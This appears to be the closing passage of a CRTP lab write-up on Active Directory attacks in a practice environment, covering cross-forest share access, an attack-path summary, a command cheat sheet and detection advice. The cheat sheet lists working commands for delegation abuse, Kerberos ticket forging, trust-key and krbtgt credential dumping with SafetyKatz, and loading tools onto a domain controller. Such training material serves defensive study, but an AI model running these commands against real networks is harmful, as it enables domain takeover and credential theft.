### Step 4: Access the Shared Resource

```powershell
# ============================================================
# Access the explicitly shared directory on eurocorp-dc
# ============================================================

dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

#### Example Output

```
 Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp

11/16/2022  04:26 AM    <DIR>          .
11/15/2022  06:17 AM                29 secret.txt
               1 File(s)             29 bytes
               1 Dir(s)  14,017,421,312 bytes free

# Read the file
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
Dollarcorp DAs can read this!
```

> On external trusts, you can **only** access resources that the target forest has explicitly shared with your domain. To find what other services are accessible, you must request a TGS for each SPN and test if it's accepted — there is no enumeration shortcut.
{: .prompt-warning }

---

## Full Attack Path Summary

```
┌──────────────────────────────────────────────────────────────────┐
│         COMPLETE ATTACK PATH — OBJ 17, 18, 19, 20               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  OBJ 17: RBCD FROM JENKINS                                       │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ Jenkins shell (ciadmin) → GenericWrite on dcorp-mgmt      │   │
│  │ → Set-DomainRBCD → Get AES key of student VM              │   │
│  │ → Rubeus S4U → winrs -r:dcorp-mgmt cmd                    │   │
│  └───────────────────────────────────────────────────────────┘   │
│                            │                                     │
│                            ▼ DA on dollarcorp                    │
│  OBJ 18: EA VIA TRUST KEY                                        │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ OPTH as svcadmin → copy Loader to DC → winrs to DC        │   │
│  │ → SafetyKatz lsadump::trust /patch → get RC4 trust key    │   │
│  │ → Rubeus evasive-silver (forge inter-realm TGT)           │   │
│  │   + /sids:EA-519 → Rubeus asktgs mcorp-dc                 │   │
│  │ → winrs -r:mcorp-dc cmd → ENTERPRISE ADMIN!               │   │
│  └───────────────────────────────────────────────────────────┘   │
│                            │                                     │
│                            ▼ Alternative path to same result     │
│  OBJ 19: EA VIA KRBTGT GOLDEN TICKET                             │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ Use krbtgt AES256 (from DCSync) + /sids:EA-519             │   │
│  │ → Rubeus evasive-golden /ptt                               │   │
│  │ → winrs -r:mcorp-dc cmd → ENTERPRISE ADMIN!               │   │
│  │ → SafetyKatz dcsync mcorp\krbtgt → forest keys             │   │
│  └───────────────────────────────────────────────────────────┘   │
│                            │                                     │
│                            ▼ External forest (SID filtering)     │
│  OBJ 20: CROSS-FOREST ACCESS (eurocorp)                          │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ Same DC shell → SafetyKatz lsadump::trust /patch          │   │
│  │ → Get ecorp RC4 trust key                                  │   │
│  │ → Rubeus evasive-silver (NO /sids — SID filtering!)        │   │
│  │ → Rubeus asktgs cifs/eurocorp-dc                           │   │
│  │ → dir \\eurocorp-dc\SharedwithDCorp\ → secret.txt          │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────┐
│              CRTP OBJ 17-20 COMMAND CHEAT SHEET                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ═══ RBCD (OBJ 17) ═══                                           │
│  Find-InterestingDomainACL | ?{$_.identityreferencename          │
│    -match 'ciadmin'}                                             │
│  Set-DomainRBCD -Identity dcorp-mgmt                             │
│    -DelegateFrom 'dcorp-studentx$' -Verbose                      │
│  Get-DomainRBCD                                                  │
│  Loader.exe -Path SafetyKatz.exe                                 │
│    -args "sekurlsa::evasive-keys" "exit"                         │
│  Loader.exe -path Rubeus.exe -args s4u                           │
│    /user:dcorp-studentx$ /aes256:<key>                           │
│    /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt  │
│  winrs -r:dcorp-mgmt cmd                                         │
│                                                                  │
│  ═══ DA PROCESS + DC PIVOT (OBJ 18 & 20) ═══                    │
│  Loader.exe -path Rubeus.exe -args asktgt /user:svcadmin         │
│    /aes256:<key> /opsec /createnetonly:cmd.exe /show /ptt        │
│  echo F | xcopy Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe │
│  winrs -r:dcorp-dc cmd                                           │
│  netsh interface portproxy add v4tov4 listenport=8080            │
│    listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x│
│  Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe           │
│    -args "lsadump::evasive-trust /patch" "exit"                  │
│                                                                  │
│  ═══ EA VIA TRUST KEY (OBJ 18) ═══                               │
│  Loader.exe -path Rubeus.exe -args evasive-silver                │
│    /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL                    │
│    /rc4:<trust_rc4> /sid:<dcorp_SID>                             │
│    /sids:<mcorp_SID>-519 /ldap /user:Administrator /nowrap       │
│  Loader.exe -path Rubeus.exe -args asktgs                        │
│    /service:http/mcorp-dc.MONEYCORP.LOCAL                        │
│    /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<base64>            │
│  winrs -r:mcorp-dc.moneycorp.local cmd                           │
│                                                                  │
│  ═══ EA VIA GOLDEN TICKET (OBJ 19) ═══                           │
│  Loader.exe -path Rubeus.exe -args evasive-golden                │
│    /user:Administrator /id:500                                   │
│    /domain:dollarcorp.moneycorp.local /sid:<dcorp_SID>           │
│    /sids:<mcorp_SID>-519 /aes256:<krbtgt_aes256>                 │
│    /netbios:dcorp /ptt                                           │
│  winrs -r:mcorp-dc.moneycorp.local cmd                           │
│  Loader.exe -path SafetyKatz.exe -args                           │
│    "lsadump::evasive-dcsync /user:mcorp\krbtgt                   │
│    /domain:moneycorp.local" "exit"                               │
│                                                                  │
│  ═══ CROSS-FOREST EUROCORP (OBJ 20) ═══                          │
│  # (No /sids — SID filtering on external trust!)                 │
│  Loader.exe -path Rubeus.exe -args evasive-silver                │
│    /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL                    │
│    /rc4:<ecorp_trust_rc4> /sid:<dcorp_SID>                       │
│    /ldap /user:Administrator /nowrap                             │
│  Loader.exe -path Rubeus.exe -args asktgs                        │
│    /service:cifs/eurocorp-dc.eurocorp.LOCAL                      │
│    /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:<base64>          │
│  dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\               │
│  type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Detection and Mitigations

```
┌──────────────────────────────────────────────────────────────────┐
│           DETECTION INDICATORS                                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  RBCD ABUSE:                                                     │
│  • Event ID 5136 — msDS-AllowedToActOnBehalfOf... modified       │
│  • Event ID 4741 — Machine account creation (Powermad)           │
│  • Audit Write ACLs on computer objects regularly                │
│                                                                  │
│  TRUST KEY ABUSE:                                                │
│  • Event ID 4769 — S4U TGS request anomalies                    │
│  • Monitor LSA secrets on DCs for unauthorized reads             │
│  • Alert on inter-realm TGTs with unexpected SID History          │
│                                                                  │
│  GOLDEN TICKET:                                                  │
│  • Event ID 4768 — TGT issued but no prior auth event            │
│  • Tickets with unrealistic lifetimes                            │
│  • ExtraSIDs in PAC containing foreign domain groups             │
│  • Reset krbtgt password TWICE to invalidate existing tickets    │
│                                                                  │
│  CROSS-FOREST:                                                   │
│  • Event ID 4769 — TGS requested for foreign domain services     │
│  • Audit explicitly shared resources across trusts               │
│  • Enable SID Filtering on ALL trusts (enabled by default)       │
│  • Selective Authentication on external trusts                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [RBCD Exploitation — Redfox Cybersecurity](https://www.redfoxsec.com/blog/resource-based-constrained-delegation-rbcd-attack-how-attackers-exploit-active-directory-trust)
- [Kerberos Trust Abuse — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/inter-realm-tgt)
- [Trust Key Extraction and Forged Tickets — CRTP Notes](https://dev-angelist.gitbook.io/crtp-notes/readme/network-security-6/8.7-persistence-via-acls)
- [SID History Attack in Active Directory Trusts — Harmj0y](http://blog.harmj0y.net/activedirectory/a-guide-to-attacking-domain-trusts/)
- [Golden Ticket Across Trusts — Sean Metcalf](https://adsecurity.org/?p=1772)
- [Cross-Forest Trust Abuse — Penetration Testing Lab](https://pentestlab.blog/2022/04/11/domain-persistence-forged-tickets/)
- [Rubeus — GhostPack (GitHub)](https://github.com/GhostPack/Rubeus)
- [MITRE ATT&CK T1134.005 — SID-History Injection](https://attack.mitre.org/techniques/T1134/005/)
- [MITRE ATT&CK T1558.001 — Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
